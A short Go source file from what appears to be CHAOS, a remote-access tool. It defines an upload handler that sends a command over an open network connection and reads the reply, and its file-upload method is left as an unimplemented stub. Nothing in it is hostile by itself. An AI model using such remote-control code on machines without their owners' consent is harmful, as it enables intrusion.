package upload

import (
	"fmt"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	c "github.com/tiagorlampert/CHAOS/pkg/color"
	"net"
)

type UploadUseCase struct {
	Connection net.Conn
}

func NewUploadUseCase(conn net.Conn) usecase.Upload {
	return &UploadUseCase{
		Connection: conn,
	}
}

func (u UploadUseCase) Validate(param []string) {
	if len(param) != 2 {
		fmt.Println(c.Yellow, "[!] Invalid parameters to upload!")
		return
	}
}

func (u UploadUseCase) Prepare(command string) {
	err := network.Send(u.Connection, []byte(command))
	if err != nil {
		fmt.Println(c.Red, "[!] Error sending request!")
	}

	// receive response of request
	_, _ = network.Read(u.Connection)
}

func (u UploadUseCase) File(path string) {
	panic("implement me")
}
